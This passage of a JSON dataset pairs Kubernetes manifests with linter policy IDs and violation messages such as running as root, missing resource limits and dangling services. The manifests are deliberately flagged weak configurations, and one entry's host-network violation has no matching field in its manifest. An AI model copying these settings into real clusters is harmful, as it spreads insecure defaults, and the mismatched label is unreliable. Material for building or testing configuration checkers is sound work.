    "violation_text": "container \"kubernetes-client\" is not set to runAsNonRoot"
  },
  {
    "id": "2297",
    "manifest_path": "data/manifests/the_stack_sample/sample_0572.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: <ACUMOS_NAMESPACE>\n  name: kubernetes-client\n  labels:\n    app: kubernetes-client\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: kubernetes-client\n  template:\n    metadata:\n      labels:\n        app: kubernetes-client\n        <ACUMOS_SERVICE_LABEL_KEY>: <ACUMOS_KUBERNETES_CLIENT_SERVICE_LABEL>\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: <ACUMOS_SERVICE_LABEL_KEY>\n                operator: NotIn\n                values:\n                - <ACUMOS_KUBERNETES_CLIENT_SERVICE_LABEL>\n            topologyKey: kubernetes.io/node\n      containers:\n      - name: kubernetes-client\n        image: <KUBERNETES_CLIENT_IMAGE>\n        command:\n        - /bin/sh\n        - -c\n        args:\n        - set -x; cd maven; java $JAVA_OPTS -Dhttp.proxyHost=$ACUMOS_HTTP_PROXY_HOST\n          -Dhttp.proxyPort=$ACUMOS_HTTP_PROXY_PORT -Dhttp.nonProxyHosts=$ACUMOS_HTTP_NON_PROXY_HOSTS\n          -Dhttps.proxyHost=$ACUMOS_HTTP_PROXY_HOST -Dhttps.proxyPort=$ACUMOS_HTTP_PROXY_PORT\n          -Dhttps.nonProxyHosts=$ACUMOS_HTTP_NON_PROXY_HOSTS -Djava.security.egd=file:/dev/./urandom\n          -jar *.jar\n        env:\n        - name: ACUMOS_HTTP_NON_PROXY_HOSTS\n          value: <ACUMOS_HTTP_NON_PROXY_HOSTS>|cds-service\n        - name: ACUMOS_HTTP_PROXY_HOST\n          value: <ACUMOS_HTTP_PROXY_HOST>\n        - name: ACUMOS_HTTP_PROXY_PORT\n          value: <ACUMOS_HTTP_PROXY_PORT>\n        - name: JAVA_OPTS\n          value: -Xms128m -Xmx512m\n        - name: SPRING_APPLICATION_JSON\n          value: '{ \"logging\": { \"level\": { \"root\": \"INFO\" } }, \"kube\" : { \"incrementPort\":\n            \"8557\", \"singleModelPort\": \"8556\", \"folderPath\": \"/maven/home\", \"singleNodePort\":\n            \"30333\", \"singleTargetPort\": \"8061\", \"dataBrokerModelPort\": \"8556\", \"dataBrokerNodePort\":\n            \"30556\", \"dataBrokerTargetPort\": \"8556\", \"mlTargetPort\": \"8061\", \"nginxImageName\":\n            \"nginx\", \"nexusEndPointURL\": \"http://localhost:80\" }, \"dockerproxy\": {\n            \"host\": \"<ACUMOS_DOCKER_PROXY_HOST>\", \"port\": \"<ACUMOS_DOCKER_PROXY_PORT>\"\n            }, \"blueprint\": { \"ImageName\": \"<BLUEPRINT_ORCHESTRATOR_IMAGE>\", \"name\":\n            \"blueprint-orchestrator\", \"nodePort\": \"30555\", \"port\": \"8061\" }, \"nexus\":\n            { \"url\": \"http://<ACUMOS_NEXUS_HOST>:<ACUMOS_NEXUS_API_PORT>/<ACUMOS_NEXUS_MAVEN_REPO_PATH>/<ACUMOS_NEXUS_MAVEN_REPO>/\",\n            \"password\": \"<ACUMOS_NEXUS_RW_USER_PASSWORD>\", \"username\": \"<ACUMOS_NEXUS_RW_USER>\",\n            \"groupid\": \"<ACUMOS_NEXUS_GROUP>\" }, \"cmndatasvc\": { \"cmndatasvcendpointurl\":\n            \"http://<ACUMOS_CDS_HOST>:<ACUMOS_CDS_PORT>/ccds\", \"cmndatasvcuser\": \"<ACUMOS_CDS_USER>\",\n            \"cmndatasvcpwd\": \"<ACUMOS_CDS_PASSWORD>\" }, \"probe\": { \"probeImageName\":\n            \"<PROTO_VIEWER_IMAGE>\", \"probeImagePORT\": \"5006\", \"probeModelPort\": \"5006\",\n            \"probeNodePort\": \"30800\", \"probeTargetPort\": \"5006\", \"probeApiPort\": \"5006\",\n            \"probeExternalPort\": \"30800\", \"probeSchemaPort\": \"80\" }, \"logstash\": {\n            \"host\": \"<ACUMOS_ELK_HOST>\", \"ip\": \"<ACUMOS_ELK_HOST_IP>\", \"port\": \"<ACUMOS_ELK_LOGSTASH_PORT>\"\n            }, \"server\": { \"port\": \"8082\" } }'\n        ports:\n        - containerPort: 8082\n        volumeMounts:\n        - mountPath: /maven/logs\n          name: logs\n      volumes:\n      - name: logs\n        persistentVolumeClaim:\n          claimName: <ACUMOS_KUBERNETES_CLIENT_SERVICE_LABEL>\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"kubernetes-client\" has cpu request 0"
  },
  {
    "id": "2298",
    "manifest_path": "data/manifests/the_stack_sample/sample_0572.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: <ACUMOS_NAMESPACE>\n  name: kubernetes-client\n  labels:\n    app: kubernetes-client\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: kubernetes-client\n  template:\n    metadata:\n      labels:\n        app: kubernetes-client\n        <ACUMOS_SERVICE_LABEL_KEY>: <ACUMOS_KUBERNETES_CLIENT_SERVICE_LABEL>\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: <ACUMOS_SERVICE_LABEL_KEY>\n                operator: NotIn\n                values:\n                - <ACUMOS_KUBERNETES_CLIENT_SERVICE_LABEL>\n            topologyKey: kubernetes.io/node\n      containers:\n      - name: kubernetes-client\n        image: <KUBERNETES_CLIENT_IMAGE>\n        command:\n        - /bin/sh\n        - -c\n        args:\n        - set -x; cd maven; java $JAVA_OPTS -Dhttp.proxyHost=$ACUMOS_HTTP_PROXY_HOST\n          -Dhttp.proxyPort=$ACUMOS_HTTP_PROXY_PORT -Dhttp.nonProxyHosts=$ACUMOS_HTTP_NON_PROXY_HOSTS\n          -Dhttps.proxyHost=$ACUMOS_HTTP_PROXY_HOST -Dhttps.proxyPort=$ACUMOS_HTTP_PROXY_PORT\n          -Dhttps.nonProxyHosts=$ACUMOS_HTTP_NON_PROXY_HOSTS -Djava.security.egd=file:/dev/./urandom\n          -jar *.jar\n        env:\n        - name: ACUMOS_HTTP_NON_PROXY_HOSTS\n          value: <ACUMOS_HTTP_NON_PROXY_HOSTS>|cds-service\n        - name: ACUMOS_HTTP_PROXY_HOST\n          value: <ACUMOS_HTTP_PROXY_HOST>\n        - name: ACUMOS_HTTP_PROXY_PORT\n          value: <ACUMOS_HTTP_PROXY_PORT>\n        - name: JAVA_OPTS\n          value: -Xms128m -Xmx512m\n        - name: SPRING_APPLICATION_JSON\n          value: '{ \"logging\": { \"level\": { \"root\": \"INFO\" } }, \"kube\" : { \"incrementPort\":\n            \"8557\", \"singleModelPort\": \"8556\", \"folderPath\": \"/maven/home\", \"singleNodePort\":\n            \"30333\", \"singleTargetPort\": \"8061\", \"dataBrokerModelPort\": \"8556\", \"dataBrokerNodePort\":\n            \"30556\", \"dataBrokerTargetPort\": \"8556\", \"mlTargetPort\": \"8061\", \"nginxImageName\":\n            \"nginx\", \"nexusEndPointURL\": \"http://localhost:80\" }, \"dockerproxy\": {\n            \"host\": \"<ACUMOS_DOCKER_PROXY_HOST>\", \"port\": \"<ACUMOS_DOCKER_PROXY_PORT>\"\n            }, \"blueprint\": { \"ImageName\": \"<BLUEPRINT_ORCHESTRATOR_IMAGE>\", \"name\":\n            \"blueprint-orchestrator\", \"nodePort\": \"30555\", \"port\": \"8061\" }, \"nexus\":\n            { \"url\": \"http://<ACUMOS_NEXUS_HOST>:<ACUMOS_NEXUS_API_PORT>/<ACUMOS_NEXUS_MAVEN_REPO_PATH>/<ACUMOS_NEXUS_MAVEN_REPO>/\",\n            \"password\": \"<ACUMOS_NEXUS_RW_USER_PASSWORD>\", \"username\": \"<ACUMOS_NEXUS_RW_USER>\",\n            \"groupid\": \"<ACUMOS_NEXUS_GROUP>\" }, \"cmndatasvc\": { \"cmndatasvcendpointurl\":\n            \"http://<ACUMOS_CDS_HOST>:<ACUMOS_CDS_PORT>/ccds\", \"cmndatasvcuser\": \"<ACUMOS_CDS_USER>\",\n            \"cmndatasvcpwd\": \"<ACUMOS_CDS_PASSWORD>\" }, \"probe\": { \"probeImageName\":\n            \"<PROTO_VIEWER_IMAGE>\", \"probeImagePORT\": \"5006\", \"probeModelPort\": \"5006\",\n            \"probeNodePort\": \"30800\", \"probeTargetPort\": \"5006\", \"probeApiPort\": \"5006\",\n            \"probeExternalPort\": \"30800\", \"probeSchemaPort\": \"80\" }, \"logstash\": {\n            \"host\": \"<ACUMOS_ELK_HOST>\", \"ip\": \"<ACUMOS_ELK_HOST_IP>\", \"port\": \"<ACUMOS_ELK_LOGSTASH_PORT>\"\n            }, \"server\": { \"port\": \"8082\" } }'\n        ports:\n        - containerPort: 8082\n        volumeMounts:\n        - mountPath: /maven/logs\n          name: logs\n      volumes:\n      - name: logs\n        persistentVolumeClaim:\n          claimName: <ACUMOS_KUBERNETES_CLIENT_SERVICE_LABEL>\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kubernetes-client\" has memory limit 0"
  },
  {
    "id": "2299",
    "manifest_path": "data/manifests/the_stack_sample/sample_0574.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: hotel-fahmi-server-rs\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      framework: codeigniter-4\n      language: php\n      type: server\n      app: hotel-fahmi-server\n  template:\n    metadata:\n      name: hotel-fahmi-server\n      labels:\n        framework: codeigniter-4\n        language: php\n        type: server\n        app: hotel-fahmi-server\n      annotations:\n        description: merupakan aplikasi hotel fahmi yang bersifat server untuk berintaraksi\n          dengan user\n    spec:\n      containers:\n      - name: hotel-fahmi\n        image: localhost:5000/hotel-fahmi\n        ports:\n        - containerPort: 80\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 80\n          initialDelaySeconds: 0\n          periodSeconds: 10\n          timeoutSeconds: 1\n          successThreshold: 1\n          failureThreshold: 3\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"hotel-fahmi\" is using an invalid container image, \"localhost:5000/hotel-fahmi\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2300",
    "manifest_path": "data/manifests/the_stack_sample/sample_0574.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: hotel-fahmi-server-rs\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      framework: codeigniter-4\n      language: php\n      type: server\n      app: hotel-fahmi-server\n  template:\n    metadata:\n      name: hotel-fahmi-server\n      labels:\n        framework: codeigniter-4\n        language: php\n        type: server\n        app: hotel-fahmi-server\n      annotations:\n        description: merupakan aplikasi hotel fahmi yang bersifat server untuk berintaraksi\n          dengan user\n    spec:\n      containers:\n      - name: hotel-fahmi\n        image: localhost:5000/hotel-fahmi\n        ports:\n        - containerPort: 80\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 80\n          initialDelaySeconds: 0\n          periodSeconds: 10\n          timeoutSeconds: 1\n          successThreshold: 1\n          failureThreshold: 3\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "2301",
    "manifest_path": "data/manifests/the_stack_sample/sample_0574.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: hotel-fahmi-server-rs\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      framework: codeigniter-4\n      language: php\n      type: server\n      app: hotel-fahmi-server\n  template:\n    metadata:\n      name: hotel-fahmi-server\n      labels:\n        framework: codeigniter-4\n        language: php\n        type: server\n        app: hotel-fahmi-server\n      annotations:\n        description: merupakan aplikasi hotel fahmi yang bersifat server untuk berintaraksi\n          dengan user\n    spec:\n      containers:\n      - name: hotel-fahmi\n        image: localhost:5000/hotel-fahmi\n        ports:\n        - containerPort: 80\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 80\n          initialDelaySeconds: 0\n          periodSeconds: 10\n          timeoutSeconds: 1\n          successThreshold: 1\n          failureThreshold: 3\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hotel-fahmi\" does not have a read-only root file system"
  },
  {
    "id": "2302",
    "manifest_path": "data/manifests/the_stack_sample/sample_0574.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: hotel-fahmi-server-rs\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      framework: codeigniter-4\n      language: php\n      type: server\n      app: hotel-fahmi-server\n  template:\n    metadata:\n      name: hotel-fahmi-server\n      labels:\n        framework: codeigniter-4\n        language: php\n        type: server\n        app: hotel-fahmi-server\n      annotations:\n        description: merupakan aplikasi hotel fahmi yang bersifat server untuk berintaraksi\n          dengan user\n    spec:\n      containers:\n      - name: hotel-fahmi\n        image: localhost:5000/hotel-fahmi\n        ports:\n        - containerPort: 80\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 80\n          initialDelaySeconds: 0\n          periodSeconds: 10\n          timeoutSeconds: 1\n          successThreshold: 1\n          failureThreshold: 3\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hotel-fahmi\" is not set to runAsNonRoot"
  },
  {
    "id": "2303",
    "manifest_path": "data/manifests/the_stack_sample/sample_0574.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: hotel-fahmi-server-rs\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      framework: codeigniter-4\n      language: php\n      type: server\n      app: hotel-fahmi-server\n  template:\n    metadata:\n      name: hotel-fahmi-server\n      labels:\n        framework: codeigniter-4\n        language: php\n        type: server\n        app: hotel-fahmi-server\n      annotations:\n        description: merupakan aplikasi hotel fahmi yang bersifat server untuk berintaraksi\n          dengan user\n    spec:\n      containers:\n      - name: hotel-fahmi\n        image: localhost:5000/hotel-fahmi\n        ports:\n        - containerPort: 80\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 80\n          initialDelaySeconds: 0\n          periodSeconds: 10\n          timeoutSeconds: 1\n          successThreshold: 1\n          failureThreshold: 3\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"hotel-fahmi\" has cpu request 0"
  },
  {
    "id": "2304",
    "manifest_path": "data/manifests/the_stack_sample/sample_0574.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: hotel-fahmi-server-rs\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      framework: codeigniter-4\n      language: php\n      type: server\n      app: hotel-fahmi-server\n  template:\n    metadata:\n      name: hotel-fahmi-server\n      labels:\n        framework: codeigniter-4\n        language: php\n        type: server\n        app: hotel-fahmi-server\n      annotations:\n        description: merupakan aplikasi hotel fahmi yang bersifat server untuk berintaraksi\n          dengan user\n    spec:\n      containers:\n      - name: hotel-fahmi\n        image: localhost:5000/hotel-fahmi\n        ports:\n        - containerPort: 80\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 80\n          initialDelaySeconds: 0\n          periodSeconds: 10\n          timeoutSeconds: 1\n          successThreshold: 1\n          failureThreshold: 3\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"hotel-fahmi\" has memory limit 0"
  },
  {
    "id": "2305",
    "manifest_path": "data/manifests/the_stack_sample/sample_0575.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: node-refiner-test\n  labels:\n    app: node-refiner\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: node-refiner\n  template:\n    metadata:\n      labels:\n        app: node-refiner\n    spec:\n      serviceAccountName: node-refiner-sa\n      containers:\n      - name: application\n        image: alisoliman/node-refiner:${IMAGE_TAGGED}\n        imagePullPolicy: Always\n        ports:\n        - name: health\n          containerPort: 9102\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /alive\n            port: health\n        env:\n        - name: LISTENING_PORT\n          value: '8080'\n        resources:\n          requests:\n            cpu: 50m\n            memory: 256Mi\n          limits:\n            cpu: 200m\n            memory: 512Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"application\" does not have a read-only root file system"
  },
  {
    "id": "2306",
    "manifest_path": "data/manifests/the_stack_sample/sample_0575.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: node-refiner-test\n  labels:\n    app: node-refiner\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: node-refiner\n  template:\n    metadata:\n      labels:\n        app: node-refiner\n    spec:\n      serviceAccountName: node-refiner-sa\n      containers:\n      - name: application\n        image: alisoliman/node-refiner:${IMAGE_TAGGED}\n        imagePullPolicy: Always\n        ports:\n        - name: health\n          containerPort: 9102\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /alive\n            port: health\n        env:\n        - name: LISTENING_PORT\n          value: '8080'\n        resources:\n          requests:\n            cpu: 50m\n            memory: 256Mi\n          limits:\n            cpu: 200m\n            memory: 512Mi\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"node-refiner-sa\" not found"
  },
  {
    "id": "2307",
    "manifest_path": "data/manifests/the_stack_sample/sample_0575.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: node-refiner-test\n  labels:\n    app: node-refiner\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: node-refiner\n  template:\n    metadata:\n      labels:\n        app: node-refiner\n    spec:\n      serviceAccountName: node-refiner-sa\n      containers:\n      - name: application\n        image: alisoliman/node-refiner:${IMAGE_TAGGED}\n        imagePullPolicy: Always\n        ports:\n        - name: health\n          containerPort: 9102\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /alive\n            port: health\n        env:\n        - name: LISTENING_PORT\n          value: '8080'\n        resources:\n          requests:\n            cpu: 50m\n            memory: 256Mi\n          limits:\n            cpu: 200m\n            memory: 512Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"application\" is not set to runAsNonRoot"
  },
  {
    "id": "2308",
    "manifest_path": "data/manifests/the_stack_sample/sample_0577.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: pwe-postgres-svc\n  namespace: pwe\nspec:\n  ports:\n  - port: 7775\n  selector:\n    app: pwe-postgres\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:pwe-postgres])"
  },
  {
    "id": "2309",
    "manifest_path": "data/manifests/the_stack_sample/sample_0579.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: fluentd-aggregator\n  namespace: zcp-system\n  labels:\n    app: fluentd-aggregator\nspec:\n  type: ClusterIP\n  selector:\n    app: fluentd-aggregator\n  ports:\n  - name: fluentd-input\n    port: 24224\n    targetPort: fwd-input\n    protocol: TCP\n  - name: fluentd-input-udp\n    port: 24224\n    targetPort: fwd-input-udp\n    protocol: UDP\n  - name: prometheus-metrics\n    port: 24231\n    targetPort: prom-metrics\n    protocol: TCP\n  - name: monitor-agent\n    port: 24220\n    targetPort: monitor-agent\n    protocol: TCP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:fluentd-aggregator])"
  },
  {
    "id": "2310",
    "manifest_path": "data/manifests/the_stack_sample/sample_0582.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: mattermost\n    role: mattermost-worker\n  name: mattermost-worker\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      role: mattermost-worker\n  template:\n    metadata:\n      labels:\n        app: mattermost\n        role: mattermost-worker\n    spec:\n      containers:\n      - image: __REGISTRY_IP__/mattermost-worker:5.21.0\n        name: mattermost-worker\n        ports:\n        - containerPort: 80\n          protocol: TCP\n        volumeMounts:\n        - name: config-volume\n          mountPath: /var/mattermost/config\n      volumes:\n      - name: config-volume\n        configMap:\n          name: mattermost-v1\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mattermost-worker\" does not have a read-only root file system"
  },
  {
    "id": "2311",
    "manifest_path": "data/manifests/the_stack_sample/sample_0582.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: mattermost\n    role: mattermost-worker\n  name: mattermost-worker\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      role: mattermost-worker\n  template:\n    metadata:\n      labels:\n        app: mattermost\n        role: mattermost-worker\n    spec:\n      containers:\n      - image: __REGISTRY_IP__/mattermost-worker:5.21.0\n        name: mattermost-worker\n        ports:\n        - containerPort: 80\n          protocol: TCP\n        volumeMounts:\n        - name: config-volume\n          mountPath: /var/mattermost/config\n      volumes:\n      - name: config-volume\n        configMap:\n          name: mattermost-v1\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mattermost-worker\" is not set to runAsNonRoot"
  },
  {
    "id": "2312",
    "manifest_path": "data/manifests/the_stack_sample/sample_0582.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: mattermost\n    role: mattermost-worker\n  name: mattermost-worker\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      role: mattermost-worker\n  template:\n    metadata:\n      labels:\n        app: mattermost\n        role: mattermost-worker\n    spec:\n      containers:\n      - image: __REGISTRY_IP__/mattermost-worker:5.21.0\n        name: mattermost-worker\n        ports:\n        - containerPort: 80\n          protocol: TCP\n        volumeMounts:\n        - name: config-volume\n          mountPath: /var/mattermost/config\n      volumes:\n      - name: config-volume\n        configMap:\n          name: mattermost-v1\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mattermost-worker\" has cpu request 0"
  },
  {
    "id": "2313",
    "manifest_path": "data/manifests/the_stack_sample/sample_0582.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: mattermost\n    role: mattermost-worker\n  name: mattermost-worker\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      role: mattermost-worker\n  template:\n    metadata:\n      labels:\n        app: mattermost\n        role: mattermost-worker\n    spec:\n      containers:\n      - image: __REGISTRY_IP__/mattermost-worker:5.21.0\n        name: mattermost-worker\n        ports:\n        - containerPort: 80\n          protocol: TCP\n        volumeMounts:\n        - name: config-volume\n          mountPath: /var/mattermost/config\n      volumes:\n      - name: config-volume\n        configMap:\n          name: mattermost-v1\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mattermost-worker\" has memory limit 0"
  },
  {
    "id": "2314",
    "manifest_path": "data/manifests/the_stack_sample/sample_0583.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: aws-efa-k8s-device-plugin-daemonset\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      name: aws-efa-k8s-device-plugin\n  template:\n    metadata:\n      annotations:\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n      labels:\n        name: aws-efa-k8s-device-plugin\n    spec:\n      serviceAccount: default\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: beta.kubernetes.io/instance-type\n                operator: In\n                values:\n                - c5n.18xlarge\n                - c5n.metal\n                - g4dn.metal\n                - i3en.24xlarge\n                - i3en.metal\n                - inf1.24xlarge\n                - m5dn.24xlarge\n                - m5n.24xlarge\n                - p3dn.24xlarge\n                - r5dn.24xlarge\n                - r5n.24xlarge\n                - p4d.24xlarge\n            - matchExpressions:\n              - key: node.kubernetes.io/instance-type\n                operator: In\n                values:\n                - c5n.18xlarge\n                - c5n.metal\n                - g4dn.metal\n                - i3en.24xlarge\n                - i3en.metal\n                - inf1.24xlarge\n                - m5dn.24xlarge\n                - m5n.24xlarge\n                - p3dn.24xlarge\n                - r5dn.24xlarge\n                - r5n.24xlarge\n                - p4d.24xlarge\n      containers:\n      - image: '%s.dkr.ecr.%s.%s/eks/aws-efa-k8s-device-plugin:v0.3.3'\n        name: aws-efa-k8s-device-plugin\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n        volumeMounts:\n        - name: device-plugin\n          mountPath: /var/lib/kubelet/device-plugins\n      volumes:\n      - name: device-plugin\n        hostPath:\n          path: /var/lib/kubelet/device-plugins\n",
    "policy_id": "deprecated-service-account-field",
    "violation_text": "serviceAccount is specified (default), but this field is deprecated; use serviceAccountName instead"
  },
  {
    "id": "2315",
    "manifest_path": "data/manifests/the_stack_sample/sample_0583.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: aws-efa-k8s-device-plugin-daemonset\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      name: aws-efa-k8s-device-plugin\n  template:\n    metadata:\n      annotations:\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n      labels:\n        name: aws-efa-k8s-device-plugin\n    spec:\n      serviceAccount: default\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: beta.kubernetes.io/instance-type\n                operator: In\n                values:\n                - c5n.18xlarge\n                - c5n.metal\n                - g4dn.metal\n                - i3en.24xlarge\n                - i3en.metal\n                - inf1.24xlarge\n                - m5dn.24xlarge\n                - m5n.24xlarge\n                - p3dn.24xlarge\n                - r5dn.24xlarge\n                - r5n.24xlarge\n                - p4d.24xlarge\n            - matchExpressions:\n              - key: node.kubernetes.io/instance-type\n                operator: In\n                values:\n                - c5n.18xlarge\n                - c5n.metal\n                - g4dn.metal\n                - i3en.24xlarge\n                - i3en.metal\n                - inf1.24xlarge\n                - m5dn.24xlarge\n                - m5n.24xlarge\n                - p3dn.24xlarge\n                - r5dn.24xlarge\n                - r5n.24xlarge\n                - p4d.24xlarge\n      containers:\n      - image: '%s.dkr.ecr.%s.%s/eks/aws-efa-k8s-device-plugin:v0.3.3'\n        name: aws-efa-k8s-device-plugin\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n        volumeMounts:\n        - name: device-plugin\n          mountPath: /var/lib/kubelet/device-plugins\n      volumes:\n      - name: device-plugin\n        hostPath:\n          path: /var/lib/kubelet/device-plugins\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "2316",
    "manifest_path": "data/manifests/the_stack_sample/sample_0583.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: aws-efa-k8s-device-plugin-daemonset\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      name: aws-efa-k8s-device-plugin\n  template:\n    metadata:\n      annotations:\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n      labels:\n        name: aws-efa-k8s-device-plugin\n    spec:\n      serviceAccount: default\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: beta.kubernetes.io/instance-type\n                operator: In\n                values:\n                - c5n.18xlarge\n                - c5n.metal\n                - g4dn.metal\n                - i3en.24xlarge\n                - i3en.metal\n                - inf1.24xlarge\n                - m5dn.24xlarge\n                - m5n.24xlarge\n                - p3dn.24xlarge\n                - r5dn.24xlarge\n                - r5n.24xlarge\n                - p4d.24xlarge\n            - matchExpressions:\n              - key: node.kubernetes.io/instance-type\n                operator: In\n                values:\n                - c5n.18xlarge\n                - c5n.metal\n                - g4dn.metal\n                - i3en.24xlarge\n                - i3en.metal\n                - inf1.24xlarge\n                - m5dn.24xlarge\n                - m5n.24xlarge\n                - p3dn.24xlarge\n                - r5dn.24xlarge\n                - r5n.24xlarge\n                - p4d.24xlarge\n      containers:\n      - image: '%s.dkr.ecr.%s.%s/eks/aws-efa-k8s-device-plugin:v0.3.3'\n        name: aws-efa-k8s-device-plugin\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n        volumeMounts:\n        - name: device-plugin\n          mountPath: /var/lib/kubelet/device-plugins\n      volumes:\n      - name: device-plugin\n        hostPath:\n          path: /var/lib/kubelet/device-plugins\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"aws-efa-k8s-device-plugin\" does not have a read-only root file system"
  },
  {
    "id": "2317",
    "manifest_path": "data/manifests/the_stack_sample/sample_0583.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: aws-efa-k8s-device-plugin-daemonset\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      name: aws-efa-k8s-device-plugin\n  template:\n    metadata:\n      annotations:\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n      labels:\n        name: aws-efa-k8s-device-plugin\n    spec:\n      serviceAccount: default\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: beta.kubernetes.io/instance-type\n                operator: In\n                values:\n                - c5n.18xlarge\n                - c5n.metal\n                - g4dn.metal\n                - i3en.24xlarge\n                - i3en.metal\n                - inf1.24xlarge\n                - m5dn.24xlarge\n                - m5n.24xlarge\n                - p3dn.24xlarge\n                - r5dn.24xlarge\n                - r5n.24xlarge\n                - p4d.24xlarge\n            - matchExpressions:\n              - key: node.kubernetes.io/instance-type\n                operator: In\n                values:\n                - c5n.18xlarge\n                - c5n.metal\n                - g4dn.metal\n      